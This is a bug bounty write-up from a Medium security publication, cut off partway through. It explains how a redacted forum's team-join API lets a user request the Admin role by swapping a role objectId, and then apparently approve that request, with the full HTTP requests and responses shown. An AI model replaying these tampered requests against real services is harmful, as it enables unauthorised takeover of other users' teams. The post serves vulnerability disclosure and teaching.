---
title: Full Team Takeover
url: https://infosecwriteups.com/full-team-takeover-678c79842065?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2023-01-19
fetch_date: 2025-10-04T04:17:23.935934
---

# Full Team Takeover

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F678c79842065&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Ffull-team-takeover-678c79842065&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Ffull-team-takeover-678c79842065&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-678c79842065---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-678c79842065---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Full Team Takeover

[![Tuhin Bose](https://miro.medium.com/v2/resize:fill:64:64/1*r4z1UCOtSN2PUz0sCnKe6w.jpeg)](https://tuhin1729.medium.com/?source=post_page---byline--678c79842065---------------------------------------)

[Tuhin Bose](https://tuhin1729.medium.com/?source=post_page---byline--678c79842065---------------------------------------)

4 min read

·

Jan 9, 2023

--

2

Listen

Share

Hare Krishna! My name is Tuhin Bose ([tuhin1729](https://instagram.com/tuhin1729)). I am currently working as a Security Engineer Intern at [BugBase](https://bugbase.in). In this write-up, I am going to share one of my findings which allowed me to takeover anyone’s team.
So without wasting time, let’s directly jump into the blog:

![]()

### Introduction:

Basically, the target is a forum where people can interact with each other, create team with others etc. While analyzing the team functionality, I have noticed the following points:

1. Users can create a team.
2. Any other user can send request to join the team with any of these roles: soldier, manager & supporter. However, **they can’t send request to join the team as an admin**. Every role has a different importance level (an integer between 1 to 10) based on the permissions that they are allowed to perform in the team. For example, the role supporter has the importance level 10 (least privilege) & the role admin has the importance level 1 (most privilege).
3. If the admin of the team approves team joining request of any user, he/she will be a part of that team. However, **only admin has the permission to allow anyone in their team.**

### First Issue - Sending Request to Join a Team as Admin:

While analyzing all the HTTP requests in burp suite, I noticed a request which is responsible for fetching all the available roles:

```
POST /functions/team-roles-get HTTP/2
Host: redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: */*
Accept-Language: en-US,en;q=0.5
X-Session-Token: 5X3y9K8o5M0x3N1c7F6v3P8o3D2n0Q2b5J9v9B8g
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Content-Length: 2
Referer: https://redacted.com/
Origin: https://redacted.com

{}
```

I quicky captured the response & it looks like:

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 309
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, HEAD, OPTIONS, POST, PUT, DELETE
Access-Control-Allow-Origin: https://redacted.com
Date: Sun, 08 Jan 2023 05:18:59 GMT
Server: nginx
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Powered-By: Express
X-Xss-Protection: 1; mode=block

{"result":[{"roleName":"Soldier","importance":4,"objectId":"ZwskfB2xQr","__type":"Object","className":"TeamRole"},{"roleName":"Admin","importance":1,"objectId":"QgtliC3yRs","__type":"Object","className":"TeamRole"},{"roleName":"Manager","importance":2,"objectId":"RhvmjD4zSt","__type":"Object","className":"TeamRole"},{"roleName":"Supporter","importance":10,"objectId":"ViuokE5aTu","__type":"Object","className":"TeamRole"}]}
```

Basically, all the roles (including Admin), their importance & objectId are revealed in the response. However, through the UI, we can’t request to be an admin of the team.
Now, when I tried to send request to join the team as a Soldier, I noticed this HTTP request:

```
POST /functions/team-join-post HTTP/2
Host: redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Content-Length: 164
Referer: https://redacted.com/
X-Session-Token: 5X3y9K8o5M0x3N1c7F6v3P8o3D2n0Q2b5J9v9B8g
Origin: https://redacted.com

{"team":{"__type":"Pointer","className":"Team","objectId":"MdpcbB6bpz"},"role":{"__type":"Pointer","className":"TeamRole","objectId":"ZwskfB2xQr"},"message":"1234"}
```

“MdpcbB6bpz” is the objectId of the team & “ZwskfB2xQr” is the objectId of the role Soldier (refer to the response of /functions/team-roles-get). Now what if we change the objectId of Soldier to objectId of Admin in the above request? I expected some kind of error message but…

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Content-Length: 95
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, HEAD, OPTIONS, POST, PUT, DELETE
Access-Control-Allow-Origin: https://redacted.com
Date: Sun, 08 Jan 2023 06:37:56 GMT
Server: nginx
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Powered-By: Express
X-Xss-Protection: 1; mode=block

{"result":{"awaitingApproval":true,"message":"1234","objectId":"GfqdcC7cqA","__type":"Object","className":"TeamMember"}}
```

Request submitted successfully :) “GfqdcC7cqA” is the objectId of the team joining request.

**Second Issue - Approving Team Joining Request on Behalf of Admin:**

Now even if we send our team joining request to be an admin of the team, the real admin won’t allow our request as he/she can clearly see the role which we applied for.
When I logged in to the admin account & tried to approve a team joining request, I noticed the following HTTP request:

```
POST /functions/team-join-response-post HTTP/2
Host: redacted.com
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Content-Type: application/json; charset=utf-8
Accept: */*
X-Session-Token: 6Y4z0L9p6N1d4O2d8G7w4Q9p4E3o1R3c6K0w0C9h
Origin: https://redacted.com
Referer: https://redacted.com/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

{"team":{"__type":"Pointer","className":"Team","objectId":"MdpcbB6bpz"},"member":{"__type":"Pointer","className":"TeamMember","objectId":"GfqdcC7cqA"},"isApproved":true}
```

“MdpcbB6bpz” is the objectId of the team & “GfqdcC7cqA” is the objectId of the team joining request (we have seen this earlier). No...